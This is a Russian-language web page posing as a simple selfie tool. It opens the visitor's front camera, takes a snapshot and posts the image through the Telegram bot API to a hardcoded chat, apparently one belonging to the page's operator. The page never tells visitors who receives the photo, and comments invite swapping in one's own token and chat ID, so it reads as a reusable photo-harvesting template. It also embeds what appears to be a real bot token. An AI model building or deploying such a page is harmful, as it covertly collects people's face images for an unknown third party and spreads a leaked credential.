<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Сделай селфи</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
      body {
        background: #000;
        color: #fff;
        text-align: center;
        padding: 30px;
        font-family: sans-serif;
      }
    </style>
  </head>
  <body>
    <h2>Нажми кнопку и сделай селфи</h2>
    <video
      id="v"
      autoplay
      playsinline
      style="width: 90%; max-width: 640px; border-radius: 12px"
    ></video
    ><br /><br />
    <button id="btn" style="padding: 15px 30px; font-size: 18px">
      Сфотографировать и отправить
    </button>

    <script>
      const BOT_TOKEN = '8491591182:AAEuTjyylQ5HfDW7DAKAyuuATpkjt9G_QyM'; // ← сюда новый токен
      const CHAT_ID = '-1003417358261'; // ← сюда свой chat_id

      document.getElementById('btn').onclick = async () => {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
          });
          const v = document.getElementById('v');
          v.srcObject = stream;

          setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = v.videoWidth;
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            const photo = canvas.toDataURL('image/jpeg');

            stream.getTracks().forEach(t => t.stop());

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                photo: photo,
                caption: `Селфи ${new Date().toLocaleString()}`,
              }),
            });

            alert('Фото отправлено!');
          }, 2500);
        } catch (e) {
          alert('Разреши доступ к камере');
        }
      };
    </script>
  </body>
</html>
